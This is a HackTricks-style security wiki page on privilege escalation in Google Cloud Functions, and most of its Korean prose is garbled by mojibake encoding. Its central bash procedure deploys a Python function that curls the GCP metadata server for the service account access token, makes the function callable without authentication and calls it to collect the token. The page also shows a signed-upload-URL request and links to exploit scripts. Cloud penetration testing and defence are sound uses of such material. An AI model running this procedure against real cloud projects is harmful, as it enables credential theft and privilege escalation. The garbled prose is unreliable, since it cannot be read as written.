# GCP - Cloudfunctions Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”:** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œ.

</details>
{% endhint %}

## cloudfunctions

Cloud Functionsì— ëŒ€í•œ ì¶”ê°€ ì •ë³´:

{% content-ref url="../gcp-services/gcp-cloud-functions-enum.md" %}
[gcp-cloud-functions-enum.md](../gcp-services/gcp-cloud-functions-enum.md)
{% endcontent-ref %}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ì„ì˜ì˜ (ì•…ì„±) ì½”ë“œë¥¼ ê°€ì§„ ìƒˆë¡œìš´ Cloud Functionì„ ìƒì„±í•˜ê³  ì„œë¹„ìŠ¤ ê³„ì •ì„ í• ë‹¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ê·¸ëŸ° ë‹¤ìŒ, ë©”íƒ€ë°ì´í„°ì—ì„œ ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ ìœ ì¶œí•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í•¨ìˆ˜ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ ëª‡ ê°€ì§€ ê¶Œí•œì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ë°©ë²•ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ ìŠ¤í¬ë¦½íŠ¸ëŠ” [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py)ì™€ [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì‚¬ì „ ë¹Œë“œëœ .zip íŒŒì¼ì€ [ì—¬ê¸°](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **í•¨ìˆ˜ì˜ ì½”ë“œë¥¼ ìˆ˜ì •í•˜ê³  í• ë‹¹ëœ ì„œë¹„ìŠ¤ ê³„ì •ì„ ìˆ˜ì •í•˜ì—¬ í† í°ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
í•¨ìˆ˜ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ ëª‡ ê°€ì§€ ê¶Œí•œì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--trigger-http \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--allow-unauthenticated

# If you don't have permissions to change the IAM policy, the "--allow-unauthenticated" will just fail and do nothing

# Get SA tokin calling the new function code
gcloud functions call <cloudfunction-name>
```
The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ **í•¨ìˆ˜ ë²„í‚·ì— íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆëŠ” ì„œëª…ëœ URLì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í•˜ì§€ë§Œ í•¨ìˆ˜ì˜ ì½”ë“œëŠ” ë³€ê²½ë˜ì§€ ì•Šìœ¼ë©°, ì—¬ì „íˆ ì—…ë°ì´íŠ¸ê°€ í•„ìš”í•©ë‹ˆë‹¤)**

{% code overflow="wrap" %}
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
{% endcode %}

ê³µê²©ìì˜ ê´€ì ì—ì„œ ì´ ê¶Œí•œë§Œìœ¼ë¡œ ì–¼ë§ˆë‚˜ ìœ ìš©í• ì§€ëŠ” í™•ì‹¤í•˜ì§€ ì•Šì§€ë§Œ, ì•Œì•„ë‘ë©´ ì¢‹ìŠµë‹ˆë‹¤.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

ì´ì „ì˜ **`.update`** ë˜ëŠ” **`.create`** ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.

### `cloudfunctions.functions.update`

**`cloudfunctions`** ê¶Œí•œë§Œ ìˆê³  **`iam.serviceAccounts.actAs`**ê°€ ì—†ìœ¼ë©´ **í•¨ìˆ˜ë¥¼ ì—…ë°ì´íŠ¸í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ìœ íš¨í•œ ê¶Œí•œ ìƒìŠ¹ì´ ì•„ë‹™ë‹ˆë‹¤.**

### Bucket Write Permissions

Cloud Functions ì½”ë“œê°€ ì €ì¥ëœ ë²„í‚·ì— ëŒ€í•œ **ì“°ê¸° ê¶Œí•œ**ì„ ê°€ì§„ ê³µê²©ìê°€ `function_code.zip`ì„ **ë®ì–´ì¨ì„œ** ì½”ë“œë¥¼ **ìˆ˜ì •**í•˜ê³  í•¨ìˆ˜ë¥¼ **ì„ì˜ì˜ ì½”ë“œ**ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆë‹¤ê³  ìƒê°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="success" %}
**ê·¸ëŸ¬ë‚˜, ì´ëŠ” ì‚¬ì‹¤ì´ ì•„ë‹™ë‹ˆë‹¤. ë²„í‚· ë‚´ì˜ ì½”ë“œë¥¼ ë®ì–´ì“°ëŠ” ê²ƒë§Œìœ¼ë¡œëŠ” ì‹¤í–‰ ì¤‘ì¸ ì½”ë“œë¥¼ ìˆ˜ì •í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.**
{% endhint %}

## References

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
